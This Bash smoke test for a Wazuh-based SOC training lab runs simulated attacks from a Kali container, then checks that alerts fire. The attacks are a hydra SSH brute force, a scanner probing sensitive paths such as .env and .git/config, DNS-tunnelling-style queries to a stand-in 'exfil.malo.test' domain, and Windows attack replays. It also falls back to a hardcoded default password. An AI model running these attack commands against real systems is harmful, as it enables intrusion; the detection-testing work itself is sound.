#!/usr/bin/env bash
# =============================================================================
#  Prueba de humo del laboratorio (la usa la CI en x86_64 y en ARM64).
#  Comprueba que: Wazuh arranca, los agentes conectan, y que los ataques del
#  curso generan alertas (fuerza bruta SSH, escaneo web, HTTPS, proxy, DNS,
#  cron, sudo y replay de Windows). También prueba ./lab.sh capture, turno,
#  version y update.
#  También puedes lanzarla tú:  ./tests/smoke.sh
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")/.."

PASS=$(grep -E '^INDEXER_PASSWORD=' .env 2>/dev/null | cut -d= -f2- || true)
PASS=${PASS:-SecretPassword}
IDX="https://localhost:9200"
FAILED=0

step() { printf "\n\033[1;36m== %s\033[0m\n" "$*"; }
ok()   { printf "\033[1;32m  ✔ %s\033[0m\n" "$*"; }
ko()   { printf "\033[1;31m  ✘ %s\033[0m\n" "$*"; FAILED=1; }

step "1. Instalación (./lab.sh setup)"
./lab.sh setup

step "2. Los agentes srv-web, srv-ssh, srv-dns y srv-proxy están activos"
for _ in $(seq 1 30); do
  active=$(docker compose exec -T wazuh.manager /var/ossec/bin/agent_control -l \
             | grep -cE "Name: srv-(web|ssh|dns|proxy).*Active" || true)
  [ "$active" -ge 4 ] && break
  sleep 10
done
docker compose exec -T wazuh.manager /var/ossec/bin/agent_control -l | grep "ID:" || true
[ "${active:-0}" -ge 4 ] && ok "4 agentes activos" || ko "Solo ${active:-0} agentes activos"

step "3. Fuerza bruta SSH desde la Kali (hydra)"
docker compose exec -T attacker hydra -l soporte -P /root/wordlists/passwords.txt \
  -t 4 -f ssh://172.30.10.11 | tee /tmp/hydra.txt || true
grep -q "password: sunshine" /tmp/hydra.txt && ok "hydra encontró la contraseña" || ko "hydra no encontró la contraseña"
docker compose exec -T attacker sh -c 'grep -q "\. /root/.bashrc-soclab" /root/.bashrc && grep -q "atacante" /root/.bashrc-soclab' \
  && ok "prompt de atacante en la Kali" || ko "la Kali no tiene el prompt de atacante"

step "4. Escaneo web (peticiones a rutas inexistentes)"
docker compose exec -T attacker bash -c \
  'for p in admin.php wp-login.php .env .git/config backup.zip phpmyadmin/ shell.php config.bak \
            test.php db.sql old/ cgi-bin/test.cgi server-status login.jsp; do
     curl -s -o /dev/null -A "Nikto/2.5.0" "http://172.30.10.10/$p"; done'
ok "15 peticiones enviadas"

step "4b. DNS: la Kali resuelve la zona interna con srv-dns"
docker compose exec -T attacker dig +short srv-web.hackerlab.local | tee /tmp/dig.txt
grep -qx "172.30.10.10" /tmp/dig.txt && ok "srv-web.hackerlab.local = 172.30.10.10" || ko "srv-web.hackerlab.local no resuelve"
docker compose exec -T attacker dig +short TXT hackerlab.local | grep -q "spf1" \
  && ok "registro TXT (SPF) de hackerlab.local" || ko "falta el TXT de hackerlab.local"
docker compose exec -T attacker dig +short -x 172.30.10.11 | grep -q "srv-ssh.hackerlab.local" \
  && ok "resolución inversa (PTR) de 172.30.10.11" || ko "falla la resolución inversa"
LONG=$(printf 'a%.0s' $(seq 1 60))
docker compose exec -T attacker dig +short "${LONG}.exfil.malo.test" >/dev/null || true
docker compose exec -T attacker bash -c 'for i in $(seq 1 45); do dig +short +tries=1 +time=2 "q$i.malo.test" >/dev/null; done'
ok "consulta con subdominio largo y ráfaga de 45 consultas enviadas"

step "4d. HTTPS en srv-web y proxy de salida (srv-proxy)"
code=$(docker compose exec -T attacker curl -sk -o /dev/null -w '%{http_code}' https://srv-web.hackerlab.local/ || true)
[ "$code" = "200" ] && ok "HTTPS en srv-web responde 200" || ko "HTTPS en srv-web responde '$code'"
code=$(docker compose exec -T attacker curl -s -o /dev/null -w '%{http_code}' -x http://srv-proxy.hackerlab.local:3128 http://srv-web.hackerlab.local/proxy-test || true)
[ "$code" = "404" ] && ok "petición a través del proxy (404 esperado)" || ko "el proxy responde '$code'"
docker compose exec -T attacker curl -s -o /dev/null -x http://srv-proxy.hackerlab.local:3128 http://srv-web.hackerlab.local/ || true
sleep 3
docker compose exec -T srv-web tail -n 20 /var/log/nginx/access.log | tee /tmp/access.txt | tail -n 4
grep -q 'tls="TLSv1.[23]" sni="srv-web.hackerlab.local"' /tmp/access.txt && ok "el log web guarda TLS y SNI" || ko "el log web no guarda TLS y SNI"
grep -q '^172.30.10.8 .*xff="172.30.10.66"' /tmp/access.txt && ok "por el proxy: IP del proxy y X-Forwarded-For con la Kali" || ko "falta X-Forwarded-For en el log web"

step "4c. Herramientas de red en la Kali y captura de tráfico"
docker compose exec -T attacker sh -c 'command -v tcpdump >/dev/null && command -v ss >/dev/null && command -v ip >/dev/null' \
  && ok "tcpdump, ss e ip en la Kali" || ko "faltan tcpdump, ss o ip en la Kali"
( sleep 4; docker compose exec -T attacker curl -s -o /dev/null http://172.30.10.10/ ) &
./lab.sh capture srv-web 10
wait
PCAP=$(ls -t captures/srv-web-*.pcap 2>/dev/null | head -n 1 || true)
if [ -n "$PCAP" ] && [ "$(wc -c < "$PCAP")" -gt 200 ]; then
  ok "captura creada: $PCAP ($(wc -c < "$PCAP") bytes)"
else
  ko "./lab.sh capture no ha creado una captura con tráfico"
fi
./lab.sh version | grep -q "soc-lab $(cat VERSION)" && ok "./lab.sh version" || ko "./lab.sh version"

step "5. Replay de ataques de Windows"
./lab.sh replay dcsync pass-the-hash psexec lsass-mimikatz

step "6. Las alertas llegan al indexer"
count() {
  curl -sk -u "admin:${PASS}" "${IDX}/wazuh-alerts-*/_count" \
    -H 'Content-Type: application/json' -d "{\"query\":{\"query_string\":{\"query\":\"$1\"}}}" \
    | python3 -c 'import sys,json; print(json.load(sys.stdin).get("count",0))' 2>/dev/null || echo 0
}
check() {
  local label="$1" query="$2" n=0
  for _ in $(seq 1 18); do
    n=$(count "$query")
    [ "$n" -gt 0 ] && break
    sleep 10
  done
  [ "$n" -gt 0 ] && ok "$label: $n alertas" || ko "$label: 0 alertas  (query: $query)"
}
check "SSH: autenticación fallida en srv-ssh" 'agent.name:srv-ssh AND rule.groups:authentication_failed'
check "Web: errores 4xx en srv-web"           'agent.name:srv-web AND rule.groups:web'
check "Windows: eventos reproducidos"          'rule.groups:windows'
check "DNS: consultas de la Kali en srv-dns"   'agent.name:srv-dns AND rule.id:100111 AND data.srcip:172.30.10.66'
check "DNS: respuestas de srv-dns"             'agent.name:srv-dns AND rule.id:100112'
check "DNS: subdominio largo (túnel)"          'rule.id:100113'
check "DNS: ráfaga de consultas"               'rule.id:100114'
check "Proxy: navegación registrada"           'agent.name:srv-proxy AND rule.id:100120 AND data.srcip:172.30.10.66'

step "6b. Simulación de turno (./lab.sh turno, en modo rápido)"
SOC_LAB_TURNO_RAPIDO=1 ./lab.sh turno
check "Turno: cambio legítimo en la web (FIM)"  'agent.name:srv-web AND rule.groups:syscheck'
check "Turno: sudo de mgarcia"                  'agent.name:srv-ssh AND rule.id:(5402 OR 5403 OR 5407)'
check "Turno: soporte intenta sudo sin permiso" 'agent.name:srv-ssh AND rule.id:5405'
check "Turno: fuerza bruta con acceso (40112)"  'agent.name:srv-ssh AND rule.id:40112'
check "Turno: crontab cambiado (cron)"          'agent.name:srv-ssh AND rule.id:2832'
check "Turno: crontab de soporte (FIM)"         'agent.name:srv-ssh AND syscheck.path:*cron*'
check "Turno: usuario nuevo (log)"              'agent.name:srv-ssh AND rule.id:5902'
check "Turno: /etc/passwd cambiado (FIM)"       'agent.name:srv-ssh AND syscheck.path:*passwd'
check "Turno: escaneo web por HTTPS"            'agent.name:srv-web AND rule.groups:web AND full_log:*tls*'
check "Turno: replays de Windows"               'rule.id:60154'

step "7. ./lab.sh update (sin descargar: reconstruye y arranca conservando los datos)"
before=$(count 'rule.id:100111')
SOC_LAB_NO_PULL=1 ./lab.sh update
after=$(count 'rule.id:100111')
[ "$after" -ge "$before" ] && [ "$before" -gt 0 ] && ok "las alertas se conservan tras update ($after)" || ko "se han perdido alertas tras update ($before → $after)"

echo
if [ "$FAILED" -eq 0 ]; then
  printf "\033[1;32mTODO OK: el laboratorio funciona en %s\033[0m\n" "$(docker info --format '{{.Architecture}}')"
else
  printf "\033[1;31mHay pruebas fallidas\033[0m\n"
  exit 1
fi
